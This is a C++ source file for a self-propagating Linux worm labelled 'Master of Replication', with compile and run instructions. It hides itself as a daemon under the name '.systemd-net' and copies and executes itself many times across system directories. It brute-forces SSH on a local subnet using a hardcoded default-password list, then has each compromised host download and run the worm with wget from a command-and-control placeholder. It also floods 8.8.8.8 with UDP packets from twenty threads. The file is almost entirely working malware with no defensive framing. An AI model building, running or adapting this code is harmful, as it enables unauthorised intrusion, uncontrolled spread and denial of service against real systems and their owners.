/*
 * ======================================================
 * MASTER OF REPLICATION - C++ WORM
 * ======================================================
 * Role: Wide-Spread Attacker
 * Language: C++ (Standalone - Independent of BLACK DEMON)
 * Abilities:
 *   - Infinite Replication: Copies itself thousands of times
 *   - Network Rush: Rapid network propagation via SSH
 *   - Swarm Assault: Massive parallel attacks (DDoS simulation)
 *   - Rapid Expansion: Multi-threaded control of multiple systems
 *   - Self-Propagation: Autonomous spread without user intervention
 * Strength: Numbers & Speed
 * 
 * Compile: g++ -O2 -Wall -pthread -o worm_replication worm_replication.cpp
 * Usage: ./worm_replication
 * ======================================================
 */

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <dirent.h>
#include <signal.h>
#include <errno.h>
#include <random>

using namespace std;

// ============================================================
// CONFIGURATION
// ============================================================
#define MAX_REPLICAS 10000
#define NETWORK_RANGE "192.168.1."
#define ATTACK_TARGET "8.8.8.8"
#define SSH_PASSWORDS "root,password,123456,toor,admin,ubuntu,debian"
#define WORM_NAME ".systemd-net"
#define FLAG_FILE "/tmp/.worm_infected"
#define WORKER_THREADS 20

// ============================================================
// GLOBAL VARIABLES
// ============================================================
string self_path;
bool running = true;

// ============================================================
// 1. DAEMONIZE (Hide in Background)
// ============================================================
void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);  // Parent exits

    // Create new session
    if (setsid() < 0) exit(EXIT_FAILURE);

    // Ignore terminal I/O signals
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    // Fork again to ensure we're not a session leader
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    // Change working directory to root
    chdir("/");

    // Close all file descriptors
    for (int fd = 0; fd < sysconf(_SC_OPEN_MAX); fd++) {
        close(fd);
    }

    // Redirect stdin, stdout, stderr to /dev/null
    open("/dev/null", O_RDWR);
    dup(0);
    dup(0);
}

// ============================================================
// 2. INFINITE REPLICATION
// ============================================================
vector<string> replication_targets = {
    "/tmp/", "/var/tmp/", "/dev/shm/", "/usr/local/bin/",
    "/root/", "/home/", "/etc/", "/opt/"
};

void replicate(const string &self_path) {
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> path_dist(0, replication_targets.size() - 1);
    uniform_int_distribution<> num_dist(1, MAX_REPLICAS);

    int copies_to_make = min(num_dist(gen), MAX_REPLICAS);

    for (int i = 0; i < copies_to_make && i < 1000; i++) {
        string dest_dir = replication_targets[path_dist(gen)];
        string dest_file = dest_dir + WORM_NAME + "_" + to_string(i);

        // Copy the binary
        ifstream src(self_path, ios::binary);
        if (!src.is_open()) continue;

        ofstream dst(dest_file, ios::binary);
        if (!dst.is_open()) {
            src.close();
            continue;
        }

        dst << src.rdbuf();
        src.close();
        dst.close();

        // Make it executable
        chmod(dest_file.c_str(), 0755);

        // Fork and execute the new copy
        pid_t pid = fork();
        if (pid == 0) {
            execl(dest_file.c_str(), dest_file.c_str(), NULL);
            exit(0);
        }
    }
}

// ============================================================
// 3. NETWORK RUSH (Spread via SSH)
// ============================================================
vector<string> split_passwords(const string &passwords) {
    vector<string> result;
    string current;
    for (char c : passwords) {
        if (c == ',') {
            if (!current.empty()) {
                result.push_back(current);
                current.clear();
            }
        } else {
            current += c;
        }
    }
    if (!current.empty()) result.push_back(current);
    return result;
}

void network_rush() {
    vector<string> passwords = split_passwords(SSH_PASSWORDS);
    
    for (int i = 1; i < 255; i++) {
        string ip = string(NETWORK_RANGE) + to_string(i);

        // Fork to scan in parallel
        pid_t pid = fork();
        if (pid == 0) {
            for (const string &pwd : passwords) {
                string cmd = "sshpass -p '" + pwd + 
                           "' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@" + ip + 
                           " 'wget -O /tmp/worm http://" + string("C2_SERVER_PLACEHOLDER") + 
                           ":8080/worm; chmod +x /tmp/worm; /tmp/worm' 2>/dev/null";
                system(cmd.c_str());
            }
            exit(0);
        }
        waitpid(-1, NULL, WNOHANG);
    }
}

// ============================================================
// 4. SWARM ASSAULT (DDoS / Flood Attack)
// ============================================================
void swarm_attack(const string &target) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(80);
    inet_pton(AF_INET, target.c_str(), &target_addr.sin_addr);

    char buffer[1024];
    memset(buffer, 'A', sizeof(buffer));

    while (running) {
        sendto(sock, buffer, sizeof(buffer), 0, 
               (struct sockaddr*)&target_addr, sizeof(target_addr));
        usleep(10);  // Speed control
    }
    close(sock);
}

void swarm_assault(const string &target) {
    for (int i = 0; i < WORKER_THREADS; i++) {
        thread(swarm_attack, target).detach();
    }
}

// ============================================================
// 5. RAPID EXPANSION (Multi-threaded Control)
// ============================================================
void expand_control() {
    // Launch multiple replication threads
    for (int i = 0; i < 5; i++) {
        thread(replicate, self_path).detach();
    }

    // Launch network spread in background
    thread(network_rush).detach();

    // Launch swarm attack
    thread(swarm_assault, ATTACK_TARGET).detach();
}

// ============================================================
// 6. SELF-PROPAGATION (Main Loop)
// ============================================================
void self_propagate() {
    // Check if already infected (prevent infinite loops)
    ifstream flag(FLAG_FILE);
    if (flag.is_open()) {
        flag.close();
        return;
    }

    ofstream flag_file(FLAG_FILE);
    if (flag_file.is_open()) flag_file.close();

    // Start expansion
    expand_control();

    // Keep running
    while (running) {
        this_thread::sleep_for(chrono::minutes(1));
        // Random replication to new locations
        if (rand() % 10 < 3) {
            thread(replicate, self_path).detach();
        }
    }
}

// ============================================================
// 7. SIGNAL HANDLER
// ============================================================
void signal_handler(int sig) {
    if (sig == SIGTERM || sig == SIGINT) {
        running = false;
    }
}

// ============================================================
// MAIN
// ============================================================
int main(int argc, char *argv[]) {
    // Get current binary path
    char path[256];
    if (readlink("/proc/self/exe", path, sizeof(path)) < 0) {
        strcpy(path, argv[0]);
    }
    self_path = string(path);

    cout << "[*] Master of Replication (C++ Worm) activated." << endl;

    // Daemonize
    daemonize();

    // Setup signal handling
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);

    // Seed random
    srand(time(NULL) ^ getpid());

    // Start propagation
    self_propagate();

    return 0;
}
